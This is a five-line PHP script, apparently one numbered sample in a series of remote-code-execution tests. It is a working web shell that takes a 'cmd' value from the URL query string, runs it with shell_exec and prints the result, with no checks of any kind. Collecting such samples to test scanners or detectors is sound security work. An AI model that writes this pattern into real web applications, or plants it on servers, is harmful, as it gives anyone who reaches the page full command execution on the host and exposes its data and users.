<?php
// RCE test variation #457
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>